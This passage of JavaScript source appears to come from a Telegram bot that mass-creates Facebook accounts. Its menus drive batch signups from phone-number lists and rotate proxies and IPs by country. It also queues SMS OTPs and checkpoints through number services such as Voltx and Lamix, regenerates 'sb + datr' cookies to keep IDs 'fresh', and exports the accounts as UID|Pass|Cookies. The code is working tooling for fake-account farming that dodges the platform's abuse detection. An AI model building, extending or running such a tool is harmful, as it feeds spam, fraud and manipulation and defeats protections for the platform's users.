      ? `🟢 RUNNING (${run.completed}/${run.total})`
      : `⚪ IDLE`;
    const quotaBar = renderProgressBar(user.usedToday, user.dailyLimit, 8);
    const [countryName] = getCountryInfo(cfg.cc);
    const engineLabel = (cfg.engine_mode || 'hybrid').toUpperCase();
    const pxModeLabel = (cfg.proxy_mode || 'rotate').toUpperCase();
    const brand = st.brandName || DEFAULT_BRAND_NAME;
    const totalPxBytes = proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes;

    return [
      `💎 <b>${escapeHtml(brand)} PRO • CONTROL HUB</b>`,
      DIVIDER,
      `👤 <b>Profile:</b> ${escapeHtml(user.firstName)} (<code>${escapeHtml(user.id)}</code>)`,
      `🛡 <b>Tier:</b> ${isUserAdmin(user, st) ? '👑 ADMIN' : '✅ APPROVED'}  •  🏷 <b>Brand:</b> <code>${escapeHtml(brand)}</code>`,
      `🎯 <b>Daily Quota:</b> <code>${user.usedToday}/${user.dailyLimit}</code> [<code>${quotaBar}</code>]`,
      ``,
      `⚙️ <b>Engine Configuration</b>`,
      `├ 🌍 Country: <code>+${escapeHtml(cfg.cc)}</code> (${escapeHtml(countryName)})  •  🔑 Pass: ${pwBadge}`,
      `├ 🚀 Engine: <code>${escapeHtml(engineLabel)}</code>  •  🔍 GQL: ${cfg.precheck_gql !== false ? (cfg.gql_via_direct !== false ? '⚡ DIRECT' : '🌐 PROXY') : '🔴 OFF'}`,
      `├ 💻 PC OTP: <code>${cfg.pc_otp_resends ?? 3}x</code>  •  📡 Lamix: ${cfg.lamix_token ? '🟢 ON' : '⚪ OFF'}  •  ⚡ Threads: <code>${cfg.threads ?? 4}x</code>`,
      `└ 🌐 Proxies: <code>${proxyCnt}</code> (<code>${escapeHtml(pxModeLabel)}</code>)  •  💾 Saver: ${cfg.proxy_saver !== false ? '🟢 ON' : '🔴 OFF'}${totalPxBytes > 0 ? ` (${formatBytes(totalPxBytes)})` : ''}`,
      ``,
      `📊 <b>Vault & Live Status</b>`,
      `├ ✅ Ready: <code>${readyCnt}</code>  •  🔐 OTP: <code>${pendingCnt}</code>  •  ✔️ Done: <code>${doneCnt}</code>`,
      `└ ⚡ My Runner: <b>${runnerBadge}</b>${activeTotal > 0 ? `  •  👥 Multi-User Active: <code>${activeTotal}</code>` : ''}`,
      ``,
      `👑 <b>Owner:</b> ${escapeHtml(st.adminUsername)}  •  📢 <b>Channel:</b> ${escapeHtml(getChannelHandle(st.channelUrl))}`,
      `<blockquote>💬 ${escapeHtml(st.welcomeNote)}</blockquote>`,
    ].join('\n');
  }

  async function renderHome(chatId, tgUser, editMsgId) {
    const st = readSettings();
    const user = getOrCreateUser(tgUser);
    const isAdmin = isUserAdmin(user, st);

    if (st.maintenanceMode && !isAdmin) {
      const maintText = [
        `🛠 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • MAINTENANCE MODE</b>`,
        DIVIDER,
        `The bot is currently undergoing scheduled maintenance by the administrator.`,
        `Please check our official channel for live updates.`,
        ``,
        `👑 <b>Owner:</b> ${escapeHtml(st.adminUsername)}`,
        `📢 <b>Channel:</b> ${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}`,
      ].join('\n');
      const maintKb = {
        inline_keyboard: [
          [
            btnUrl('📢 Channel Updates', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
            btnUrl('👑 Contact Owner', st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
          ],
          [btnOk('🔄 Check Status', 'menu:home')],
        ],
      };
      if (editMsgId) await editMessage(chatId, editMsgId, maintText, maintKb);
      else await sendMessage(chatId, maintText, maintKb);
      return;
    }

    if (user.status === 'blocked') {
      const blockedText = [
        `🚫 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • ACCESS RESTRICTED</b>`,
        DIVIDER,
        `Your Telegram account (<code>${escapeHtml(user.id)}</code>) is currently blocked.`,
        ``,
        `<blockquote>📩 Contact Owner: ${escapeHtml(st.adminUsername)}</blockquote>`,
      ].join('\n');
      const blkKb = {
        inline_keyboard: [
          [
            btnUrl('👑 Contact Owner', st.ownerUrl || DEFAULT_OWNER_URL, 'danger'),
            btnUrl('📢 Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
          ],
        ],
      };
      if (editMsgId) await editMessage(chatId, editMsgId, blockedText, blkKb);
      else await sendMessage(chatId, blockedText, blkKb);
      return;
    }

    if (!isAdmin && st.requireChannelJoin) {
      const ch = await checkChannelMembership(user.id, st);
      if (!ch.ok) {
        const joinText = [
          `📢 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • CHANNEL VERIFICATION</b>`,
          DIVIDER,
          `To use <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} Bot</b>, please join our official Telegram channel first:`,
          ``,
          `🔗 <b>Channel:</b> ${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}`,
          `👑 <b>Owner:</b> ${escapeHtml(st.adminUsername)}`,
        ].join('\n');
        const joinKb = {
          inline_keyboard: [
            [btnUrl('📢 Join Official Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary')],
            [btnOk('✅ I Joined • Verify Now', 'menu:home')],
          ],
        };
        if (editMsgId) await editMessage(chatId, editMsgId, joinText, joinKb);
        else await sendMessage(chatId, joinText, joinKb);
        return;
      }
    }

    if (user.status !== 'approved' && !isAdmin) {
      const waitText = [
        `⏳ <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • APPROVAL REQUIRED</b>`,
        DIVIDER,
        `🆔 <b>Telegram ID:</b> <code>${escapeHtml(user.id)}</code>`,
        `📌 <b>Status:</b> 🟡 Pending Admin Verification`,
        `👑 <b>Owner Contact:</b> ${escapeHtml(st.adminUsername)}`,
        `📢 <b>Channel:</b> ${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}`,
        ``,
        `<blockquote>🔔 The administrator has been notified. Tap <b>Check Approval</b> below once your access is granted.</blockquote>`,
      ].join('\n');
      const kb = {
        inline_keyboard: [
          [btnOk('🔄 Check Approval Status', 'menu:home')],
          [
            btnUrl('📢 Official Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
            btnUrl('👑 Contact Owner', st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
          ],
        ],
      };
      if (editMsgId) {
        await editMessage(chatId, editMsgId, waitText, kb);
      } else {
        await sendMessage(chatId, waitText, kb);
        pushBotLog(`New pending user request: ${user.id} (@${user.username || 'none'})`);
        await sendMessage(
          st.adminId,
          [
            `🔔 <b>NEW BOT ACCESS REQUEST</b>`,
            DIVIDER,
            `👤 <b>Name:</b> ${escapeHtml(user.firstName)}`,
            `🔗 <b>Username:</b> @${escapeHtml(user.username || 'none')}`,
            `🆔 <b>User ID:</b> <code>${escapeHtml(user.id)}</code>`,
          ].join('\n'),
          {
            inline_keyboard: [
              [
                btnOk('✅ Approve User', `admin:approve:${user.id}`),
                btnBad('🚫 Block User', `admin:block:${user.id}`),
              ],
            ],
          }
        );
      }
      return;
    }

    const cfg = readUserConfig(user.id);
    const text = buildHomeText(user, cfg, st);
    const kb = buildMainMenuKb(user.id, isAdmin, st);
    if (editMsgId) await editMessage(chatId, editMsgId, text, kb);
    else await sendMessage(chatId, text, kb);
  }

  async function renderRunPrompt(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const doneCnt = readUserDone(uid).size;
    const [countryName] = getCountryInfo(cfg.cc);
    promptSessions.set(uid, { kind: 'awaiting_numbers' });
    const pwWarn = !cfg.password || cfg.password.length < 6
      ? `\n<blockquote>⚠️ <b>Default Password Missing!</b> Tap <b>Set Password First</b> below before starting.</blockquote>`
      : '';
    const txt = [
      `🚀 <b>BATCH ACCOUNT RUNNER</b>`,
      DIVIDER,
      `🌍 <b>Country:</b> <code>+${escapeHtml(cfg.cc)}</code> (${escapeHtml(countryName)})`,
      `🚀 <b>Engine:</b> <code>${escapeHtml((cfg.engine_mode || 'hybrid').toUpperCase())}</code>  •  🔍 <b>GQL Pre-Check:</b> ${cfg.precheck_gql !== false ? '🟢 ON' : '🔴 OFF'}`,
      `🔄 <b>Resume (Skip Done):</b> ${cfg.resume_mode !== false ? '🟢 ON' : '🔴 OFF'} (<code>${doneCnt}</code> saved)`,
      `⚙️ <b>Profile:</b> Threads <code>${cfg.threads ?? 4}x</code> • Retries <code>${cfg.retries}</code> • Delay <code>${cfg.delay ?? 1}s</code> • Proxy <code>${escapeHtml((cfg.proxy_mode || 'rotate').toUpperCase())}</code> • Saver ${cfg.proxy_saver !== false ? '🟢' : '🔴'}`,
      pwWarn,
      ``,
      `<blockquote>📥 Paste phone numbers below (one per line) <b>OR</b> upload a <code>.txt</code> / <code>.csv</code> file.\n💡 Quick commands: <code>/run 255771234567</code> • <code>/check 255771234567</code></blockquote>`,
    ].filter(Boolean).join('\n');
    const kb = {
      inline_keyboard: [
        ...(!cfg.password || cfg.password.length < 6 ? [[btnOk('🔑 Set Password First', 'set:pw')]] : []),
        [
          btnOk('⚡ Turbo Speed (0s • 6x)', 'run:turbo'),
          btnNav(`⚡ Threads (${cfg.threads ?? 4}x)`, 'run:cycle_threads'),
        ],
        [
          cfg.precheck_gql !== false
            ? btnOk('🔍 GQL Pre-Check: ON', 'run:toggle_gql')
            : btnBad('🔍 GQL Pre-Check: OFF', 'run:toggle_gql'),
          cfg.resume_mode !== false
            ? btnOk('🔄 Resume: ON', 'run:toggle_resume')
            : btnBad('🔄 Resume: OFF', 'run:toggle_resume'),
        ],
        [
          btnBad(`🧹 Clear Done (${doneCnt})`, 'run:clear_done'),
          btnNav('🌐 Proxies', 'menu:proxies'),
        ],
        [
          btnNav('⬅️ Back to Menu', 'menu:home'),
          btnBad('❌ Cancel', 'prompt:cancel'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderOtpQueue(chatId, uid, editMsgId) {
    const items = readUserPending(uid);
    if (items.length === 0) {
      const txt = [
        `🔐 <b>OTP & CHECKPOINT QUEUE</b>`,
        DIVIDER,
        `<i>No pending OTP or checkpoint sessions right now.</i>`,
        ``,
        `<blockquote>💡 Sessions requiring SMS verification during batch runs appear here automatically.</blockquote>`,
      ].join('\n');
      const kb = {
        inline_keyboard: [
          [
            btnOk('➕ Add Manual Session', 'otp:manual'),
            btnNav('📡 Sync Voltx', 'otp:voltx_sync'),
            btnNav('📡 Sync Lamix', 'otp:lamix_sync'),
          ],
          [
            btnOk('🔄 Refresh', 'menu:otp'),
            btnNav('⬅️ Main Menu', 'menu:home'),
          ],
        ],
      };
      if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
      else await sendMessage(chatId, txt, kb);
      return;
    }

    const lines = [
      `🔐 <b>OTP & CHECKPOINT QUEUE (${items.length})</b>`,
      DIVIDER,
    ];
    const rows = [];
    items.slice(0, 5).forEach((item, idx) => {
      const badge = item.flow === 'recovery' ? '💻' : item.status === 'CHECKPOINT' ? '🛡' : '📩';
      const det = detectCountryFromNumber(`+${item.phone}`, '880', item.country || '');
      const iso = item.iso || (det?.iso && det.iso !== '??' ? det.iso : '');
      const rsCnt = Number(item.resendCount || 0);
      lines.push(
        `${idx + 1}. ${badge} <code>+${escapeHtml(item.phone)}</code>${iso ? ` [<b>${escapeHtml(iso)}</b>]` : ''} — <b>${escapeHtml(item.flow === 'recovery' ? 'PC-RECOVER' : item.status)}</b>${rsCnt > 0 ? ` • 🔁${rsCnt}x` : ''} (${escapeHtml(item.name)})`
      );
      rows.push([
        btnOk(`🔑 Enter OTP (+${item.phone.slice(-5)})`, `otp:enter:${item.phone}`),
        btnNav(`🔁 Resend`, `otp:resend:${item.phone}`),
        btnNav(`🔎 Check`, `otp:check:${item.phone}`),
      ]);
      rows.push([
        btnNav(`🔍 Info`, `otp:inspect:${item.phone}`),
        btnNav(`⏭ Defer`, `otp:defer:${item.phone}`),
        btnBad(`🗑 Del`, `otp:del:${item.phone}`),
      ]);
    });
    if (items.length > 5) {
      lines.push(`\n<i>Showing top 5 of ${items.length} sessions. Defer or clear to process remaining.</i>`);
    }
    rows.push([
      btnOk('📡 Sync Voltx', 'otp:voltx_sync'),
      btnOk('📡 Sync Lamix', 'otp:lamix_sync'),
      btnNav('➕ Manual', 'otp:manual'),
    ]);
    rows.push([
      btnBad('🧹 Clear Queue', 'otp:clearall'),
      btnOk('🔄 Refresh OTPs', 'menu:otp'),
    ]);
    rows.push([btnNav('⬅️ Main Menu', 'menu:home')]);

    const txt = lines.join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderSettings(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const doneCnt = readUserDone(uid).size;
    const [countryName] = getCountryInfo(cfg.cc);
    const engineDesc =
      cfg.engine_mode === 'limited'
        ? 'Limited FB (Pringer JSONStream)'
        : cfg.engine_mode === 'classic'
        ? 'Classic (m.facebook Fallback)'
        : 'Hybrid (Limited + Classic)';
    const pxModeDesc =
      cfg.proxy_mode === 'fastest'
        ? 'Fastest (Health Score)'
        : cfg.proxy_mode === 'random'
        ? 'Random Shuffle'
        : 'Smart Rotate';
    const autoResendVal = Number(cfg.auto_otp_resend ?? 2);
    const totalPxBytes = proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes;
    const txt = [
      `⚙️ <b>ENGINE SETTINGS (18/18)</b>`,
      DIVIDER,
      `<b>Identity & Routing</b>`,
      `├ 🌍 Fallback CC: <code>+${escapeHtml(cfg.cc)}</code> (${escapeHtml(countryName)})`,
      `├ 🔑 Password: ${cfg.password ? `<code>${escapeHtml(cfg.password)}</code>` : '🔴 <b>NOT SET</b>'}`,
      `├ 🌐 Default Proxy: <code>${cfg.proxy ? escapeHtml(cfg.proxy) : 'none (direct/pool)'}</code>`,
      `└ 🔀 Proxy Routing: <code>${escapeHtml(pxModeDesc)}</code>`,
      ``,
      `<b>Signup Engine & Timing</b>`,
      `├ 🚀 Engine Mode: <code>${escapeHtml(engineDesc)}</code>`,
      `├ ⚡ Parallel Threads: <code>${cfg.threads ?? 4}x</code>  •  ⏱ Delay: <code>${cfg.delay ?? 1}s</code>`,
      `├ 🔁 Auto OTP Resend: <code>${autoResendVal}x</code> ${autoResendVal > 0 ? '(Automatic 2–3x fast trigger)' : '(Disabled)'}`,
      `└ 📦 Batch Break: <code>${cfg.batch}</code>  •  🔁 Retries: <code>${cfg.retries}</code>  •  ⌛ Timeout: <code>${cfg.timeout}s</code>`,
      ``,
      `<b>Pre-Check, Bandwidth & Proxy Guard</b>`,
      `├ 🔍 GQL Pre-Check: ${cfg.precheck_gql !== false ? '🟢 ON' : '🔴 OFF'}  •  📡 GQL Route: ${cfg.gql_via_direct !== false ? '⚡ DIRECT (0 PX)' : '🌐 PROXY'}`,
      `├ 💾 Proxy Saver: ${cfg.proxy_saver !== false ? '🟢 ON (~75% Less Data)' : '🔴 OFF'}  •  🛡 Strict Proxy: ${cfg.strict_proxy !== false ? '🟢 ON' : '🔴 OFF'}`,
      `├ ♻️ Auto IP Refresh: ${cfg.auto_proxy_refresh !== false ? '🟢 ON' : '🔴 OFF'}  •  🌍 Auto Country PX: ${cfg.auto_proxy_country !== false ? '🟢 ON' : '🔴 OFF'}`,
      `├ ⏭ Skip Probe: ${cfg.skip_probe ? '🟢 ON' : '🔴 OFF'}  •  🎲 Fresh ID: ${cfg.fresh_id ? '🟢 ON' : '🔴 OFF'}`,
      `└ 🔄 Resume Mode: ${cfg.resume_mode !== false ? '🟢 ON' : '🔴 OFF'} (<code>${doneCnt}</code> done)  •  📊 PX Traffic: <code>${formatBytes(totalPxBytes)}</code>`,
      ``,
      `<i>Tap any colored control below to configure:</i>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('⚡ Apply Turbo Speed (0s • 6x)', 'set:turbo'),
          btnNav(`⚡ Threads (${cfg.threads ?? 4}x)`, 'set:cycle_threads'),
        ],
        [
          btnNav(`🌍 CC (+${cfg.cc})`, 'set:cc'),
          cfg.password ? btnNav('🔑 Set Password', 'set:pw') : btnOk('🔑 Set Password', 'set:pw'),
          btnNav('👁 View Pass', 'set:viewpw'),
        ],
        [
          btnNav(`🚀 Engine: ${(cfg.engine_mode || 'hybrid').toUpperCase()}`, 'set:cycle_engine'),
          btnNav(`🔀 Proxy: ${(cfg.proxy_mode || 'rotate').toUpperCase()}`, 'set:cycle_pxmode'),
        ],
        [
          btnNav('🌐 Default Proxy', 'set:proxy'),
          btnNav(`⏱ Delay (${cfg.delay ?? 1}s)`, 'set:delay'),
          btnNav(`📦 Batch (${cfg.batch})`, 'set:batch'),
        ],
        [
          btnNav(`🔁 Retries (${cfg.retries})`, 'set:retries'),
          btnNav(`⌛ Timeout (${cfg.timeout}s)`, 'set:timeout'),
          btnNav(`🔁 Resend OTP (${autoResendVal}x)`, 'set:cycle_otpresend'),
        ],
        [
          cfg.proxy_saver !== false ? btnOk('💾 Proxy Saver: ON', 'set:toggle_pxsaver') : btnBad('💾 Proxy Saver: OFF', 'set:toggle_pxsaver'),
          cfg.gql_via_direct !== false ? btnOk('⚡ GQL: DIRECT (0 PX)', 'set:toggle_gqldirect') : btnNav('🌐 GQL: VIA PROXY', 'set:toggle_gqldirect'),
        ],
        [
          cfg.auto_proxy_refresh !== false ? btnOk('♻️ Auto IP Refresh: ON', 'set:toggle_autorefresh') : btnBad('♻️ Auto IP Refresh: OFF', 'set:toggle_autorefresh'),
          cfg.auto_proxy_country !== false ? btnOk('🌍 Auto Country PX: ON', 'set:toggle_autocountry') : btnBad('🌍 Auto Country PX: OFF', 'set:toggle_autocountry'),
        ],
        [
          cfg.precheck_gql !== false ? btnOk('🔍 GQL Check: ON', 'set:toggle_gql') : btnBad('🔍 GQL Check: OFF', 'set:toggle_gql'),
          cfg.strict_proxy !== false ? btnOk('🛡 Strict Proxy: ON', 'set:toggle_strictpx') : btnBad('🛡 Strict Proxy: OFF', 'set:toggle_strictpx'),
        ],
        [
          cfg.skip_probe ? btnOk('⏭ Skip Probe: ON', 'set:toggle_skip') : btnBad('⏭ Skip Probe: OFF', 'set:toggle_skip'),
          cfg.fresh_id ? btnOk('🎲 Fresh ID: ON', 'set:toggle_fresh') : btnBad('🎲 Fresh ID: OFF', 'set:toggle_fresh'),
        ],
        [
          cfg.resume_mode !== false ? btnOk('🔄 Resume: ON', 'set:toggle_resume') : btnBad('🔄 Resume: OFF', 'set:toggle_resume'),
          btnBad(`🧹 Clear Done (${doneCnt})`, 'run:clear_done'),
        ],
        [
          btnNav(`💻 PC OTP: ${cfg.pc_otp_resends ?? 3}x`, 'pc:set_resends'),
          btnOk('🧼 1-Click Fresh Cookies', 'cookies:fresh_all'),
        ],
        [
          btnBad('🗑 1-Click Wipe All Data', 'user:wipe_all_confirm'),
          btnNav('⬅️ Back to Menu', 'menu:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderCookiesMenu(chatId, uid, editMsgId) {
    const raw = readUserCookies(uid);
    const preview = raw.length > 900 ? raw.slice(0, 900) + '...' : raw;
    const txt = [
      `🍪 <b>BASE COOKIES &amp; FRESH ID CLEANER</b>`,
      DIVIDER,
      `Current <code>base_cookies.txt</code>:`,
      `<blockquote><code>${escapeHtml(preview)}</code></blockquote>`,
      ``,
      `🧼 <b>1-Click Fresh Cookies &amp; Cache:</b> Regenerates fresh <code>sb + datr</code> cookies, clears Done history, Logs &amp; number/session caches so your IDs stay 100% fresh!`,
      `🗑 <b>Wipe All Personal Data:</b> Clears Cookies + OTP Queue + Vault + Proxies + Caches cleanly.`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('🧼 1-Click Fresh Cookies & Cache', 'cookies:fresh_all'),
        ],
        [
          btnOk('🎲 Regen (sb+datr)', 'cookies:regen'),
          btnNav('✏️ Paste Custom', 'cookies:edit'),
        ],
        [
          btnBad('🗑 Wipe All Personal Data', 'user:wipe_all_confirm'),
          btnNav('⬅️ Back to Menu', 'menu:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAccountsMenu(chatId, uid, filter = 'ready', editMsgId) {
    const accounts = readUserAccounts(uid);
    const okOnly = accounts.filter((a) => a.status === 'OK');
    const cfCnt = accounts.filter((a) => a.status === 'CONFIRM' || a.status === 'CHECKPOINT').length;
    const failOnly = accounts.filter((a) => !['OK', 'CONFIRM', 'CHECKPOINT'].includes(a.status));

    const list = filter === 'ready' ? okOnly : filter === 'failed' ? failOnly : accounts;
    const title = filter === 'ready' ? 'Ready Accounts' : filter === 'failed' ? 'Failed / Used / Limit' : 'All Recent Logs';

    const lines = [
      `📦 <b>ACCOUNTS VAULT • ${title.toUpperCase()}</b>`,
      DIVIDER,
      `📊 Total: <code>${accounts.length}</code>  •  ✅ Ready: <code>${okOnly.length}</code>  •  🔐 OTP: <code>${cfCnt}</code>  •  ❌ Other: <code>${failOnly.length}</code>`,
      ``,
    ];
    list.slice(0, 10).forEach((a, i) => {
      if (a.status === 'OK') {
        lines.push(`${i + 1}. ✅ <code>${escapeHtml(a.uid || '-')}|${escapeHtml(a.password)}</code> (+${escapeHtml(a.number)})`);
      } else {
        const errInfo = a.err ? ` — <i>${escapeHtml(a.err.slice(0, 48))}</i>` : '';
        lines.push(`${i + 1}. <b>[${escapeHtml(a.status)}]</b> +${escapeHtml(a.number)}${errInfo}`);
      }
    });
    if (list.length === 0) lines.push('<i>No records in this view yet.</i>');

    const kb = {
      inline_keyboard: [
        [
          btnOk(`${filter === 'ready' ? '● ' : ''}✅ Ready (${okOnly.length})`, 'accounts:view:ready'),
          btnBad(`${filter === 'failed' ? '● ' : ''}❌ Fail (${failOnly.length})`, 'accounts:view:failed'),
          btnNav(`${filter === 'all' ? '● ' : ''}📜 All (${accounts.length})`, 'accounts:view:all'),
        ],
        [
          btnOk('📄 Ready (.txt)', 'accounts:txt'),
          btnOk('📋 UID|Pass|Cookies', 'accounts:uidpasscookies'),
        ],
        [
          btnNav('📊 Export CSV', 'accounts:csv'),
          btnNav('📋 Login Sheet CSV', 'accounts:loginsheet'),
        ],
        [
          btnNav('📝 Full Log (.txt)', 'accounts:fulltxt'),
          btnNav('🔍 Latest Cookie View', 'accounts:lastcookie'),
        ],
        [
          btnBad('🧹 Clear History', 'accounts:clearconfirm'),
          btnNav('⬅️ Back to Menu', 'menu:home'),
        ],
      ],
    };

    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function renderProxiesMenu(chatId, uid, editMsgId) {
    const st = readSettings();
    const cfg = readUserConfig(uid);
    const list = readUserProxies(uid);
    const globalCnt = st.shareGlobalProxies ? readGlobalProxies().length : 0;
    const autoRefresh = cfg.auto_proxy_refresh !== false;
    const autoCountry = cfg.auto_proxy_country !== false;
    const proxySaver = cfg.proxy_saver !== false;
    const totalPxBytes = proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes;
    const preview = list
      .slice(0, 10)
      .map((p, i) => {
        const h = proxyHealth.get(proxyHealthKey(p));
        const cap = inspectProxyCapabilities(p);
        const capTag =
          cap.hasCountryTag || cap.hasSessionTag
            ? ` <i>[${cap.countryCode || 'AUTO'}${cap.hasSessionTag ? ` • ssid:${escapeHtml(cap.sessionId.slice(0, 6))}` : ''}]</i>`
            : '';
        const tag = h
          ? h.streakFail >= 2
            ? ` 🔴 (${escapeHtml(h.lastErr || 'fail')})`
            : h.lastLatencyMs
            ? ` 🟢 ${h.lastLatencyMs}ms${h.exitIp ? ` [${escapeHtml(h.exitIp)}]` : ''}`
            : ''
          : '';
        return `${i + 1}. <code>${escapeHtml(p)}</code>${capTag}${tag}`;
      })
      .join('\n');
    const txt = [
      `🌐 <b>PROXY POOL MANAGER (${list.length})</b>`,
      DIVIDER,
      `🔀 <b>Routing:</b> <code>${escapeHtml((cfg.proxy_mode || 'rotate').toUpperCase())}</code>  •  🛡 <b>Strict:</b> ${cfg.strict_proxy !== false ? '🟢 ON' : '🔴 OFF'}`,
      `♻️ <b>Auto IP Refresh:</b> ${autoRefresh ? '🟢 ON' : '🔴 OFF'}  •  🌍 <b>Auto Country:</b> ${autoCountry ? '🟢 ON' : '🔴 OFF'}`,
      `💾 <b>Proxy Saver:</b> ${proxySaver ? '🟢 ON (~75% Less Data)' : '🔴 OFF'}  •  📊 <b>Used:</b> <code>${formatBytes(totalPxBytes)}</code> (${proxyTrafficStats.requests} reqs)`,
      ``,
      preview || '<i>No custom proxies added yet.</i>',
      list.length > 10 ? `<i>... +${list.length - 10} more proxies</i>` : '',
      globalCnt > 0 ? `\n<blockquote>🌍 Global fallback pool active: <b>${globalCnt}</b> proxies</blockquote>` : '',
      `\n<blockquote>💡 <b>Cost Guard:</b> Proxy Saver skips heavy warmups &amp; runs GQL checks direct (0 proxy MB) so paid GBs are used strictly for account creation &amp; OTPs.</blockquote>`,
    ].filter(Boolean).join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('➕ Add Proxies', 'proxies:add'),
          btnOk('♻️ Refresh IP Now', 'proxies:refresh_now'),
        ],
        [
          autoRefresh ? btnOk('🔄 Auto Refresh: ON', 'proxies:toggle_autorefresh') : btnBad('🔄 Auto Refresh: OFF', 'proxies:toggle_autorefresh'),
          autoCountry ? btnOk('🌍 Auto Country: ON', 'proxies:toggle_autocountry') : btnBad('🌍 Auto Country: OFF', 'proxies:toggle_autocountry'),
        ],
        [
          proxySaver ? btnOk('💾 Proxy Saver: ON', 'proxies:toggle_pxsaver') : btnBad('💾 Proxy Saver: OFF', 'proxies:toggle_pxsaver'),
          btnNav('🧪 Test Pool (Lite)', 'proxies:test'),
        ],
        [
          btnOk('⚡ Sort by Speed', 'proxies:sort'),
          btnBad('🧹 Prune Dead', 'proxies:prunedead'),
        ],
        [
          btnBad('➖ Remove #', 'proxies:removeone'),
          btnBad('🗑 Clear All', 'proxies:clear'),
        ],
        [btnNav('⬅️ Back to Menu', 'menu:home')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderLogsMenu(chatId, uid, editMsgId) {
    const userLogs = readUserLogs(uid, 25);
    const joined = userLogs.join('\n') || 'No attempt logs recorded yet.';
    const capped = joined.length > 2600 ? '...\n' + joined.slice(-2600) : joined;
    const txt = [
      `📜 <b>RECENT DEBUG LOGS (${userLogs.length})</b>`,
      DIVIDER,
      `<blockquote><code>${escapeHtml(capped)}</code></blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnNav('📄 Download Last HTML', 'logs:html'),
          btnBad('🧹 Clear Logs', 'logs:clear'),
        ],
        [
          btnOk('🔄 Refresh Logs', 'menu:logs'),
          btnNav('⬅️ Main Menu', 'menu:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  const voltxRangeCache = new Map();

  async function renderVoltxMenu(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const { apiKey, baseUrl } = resolveVoltxCreds(uid);
    const selRid = String(cfg.voltx_last_rid || '').trim();
    const selLabel = String(cfg.voltx_last_range || selRid).trim();
    const selDet = selRid ? detectCountryFromNumber(`+${selRid}`, '') : null;
    const pwBadge = cfg.password && cfg.password.length >= 6 ? `🟢 Set (${cfg.password.length}c)` : `🔴 NOT SET`;
    const keyBadge = apiKey ? `🟢 <code>${escapeHtml(maskSecretKey(apiKey))}</code>` : `🔴 <b>NOT SET</b>`;
    const run = activeRuns.get(uid);

    const txt = [
      `📡 <b>VOLTX SMS • AUTO FB CREATOR &amp; OTP</b>`,
      DIVIDER,
      `🔑 <b>Voltx API Key:</b> ${keyBadge}`,
      `🔒 <b>FB Password:</b> ${pwBadge}  •  🔍 <b>GQL Check:</b> ${cfg.precheck_gql !== false ? '🟢 ON' : '🔴 OFF'}`,
      `📌 <b>Selected Range:</b> ${selRid ? `<code>${escapeHtml(selLabel)}</code> (RID <code>${escapeHtml(selRid)}</code>${selDet ? ` • ${escapeHtml(selDet.name)}` : ''})` : '<i>None selected yet</i>'}`,
      `🌐 <b>API Base:</b> <code>${escapeHtml(baseUrl.replace(/^https?:\/\//, '').slice(0, 42))}...</code>`,
      ``,
      run?.running
        ? `⚡ <b>Active Run:</b> <code>${run.completed}/${run.total}</code> (✅${run.okCount} 🔐${run.pendingCount})`
        : `<blockquote>1️⃣ Tap <b>Browse Live Ranges</b> (or enter a custom Range ID).\n2️⃣ Pick a range → bot grabs numbers automatically, creates FB accounts &amp; watches <code>/success-otp</code> to auto-verify!</blockquote>`,
    ].join('\n');

    const rows = [];
    if (!apiKey) {
      rows.push([btnOk('🔑 Set Voltx API Key', 'voltx:setkey')]);
    }
    if (!cfg.password || cfg.password.length < 6) {
      rows.push([btnOk('🔒 Set FB Password First', 'set:pw')]);
    }
    rows.push([
      btnOk('📋 Browse Live Ranges', 'voltx:ranges:0'),
      btnNav('✏️ Enter Custom RID', 'voltx:custom_rid'),
    ]);
    if (selRid && apiKey) {
      rows.push([
        btnOk('⚡ Create 1', 'voltx:start:1'),
        btnOk('🔥 Create 3', 'voltx:start:3'),
        btnOk('🚀 Create 5', 'voltx:start:5'),
      ]);
      rows.push([
        btnOk('📦 Create 10', 'voltx:start:10'),
        btnNav('🔢 Custom Count', 'voltx:custom_count'),
      ]);
    }
    rows.push([
      btnNav('📬 Recent Voltx OTPs', 'voltx:otps'),
